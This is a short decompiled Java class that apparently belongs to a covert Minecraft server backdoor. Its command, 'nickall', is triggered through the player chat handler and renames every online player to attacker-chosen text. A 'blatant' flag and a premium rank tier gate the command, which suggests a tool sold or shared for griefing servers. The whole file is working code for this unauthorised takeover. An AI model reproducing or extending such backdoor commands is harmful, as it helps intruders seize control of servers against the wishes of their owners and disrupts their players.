package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "nickall",
   description = "Sets nick of everyone",
   blatant = true,
   rank = Rank.PREMIUM
)
public class NickAllCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      String var4 = String.join(" ", var3).replace("&", "§") + "§f";

      for(Player var6 : Bukkit.getOnlinePlayers()) {
         var6.setDisplayName(var4);
         var6.setCustomName(var4);
         var6.setCustomNameVisible(true);
         var6.setPlayerListName(var4);
      }

      ChatUtil.sendChat(var1.getPlayer(), "Renamed everyone to " + var4);
   }
}
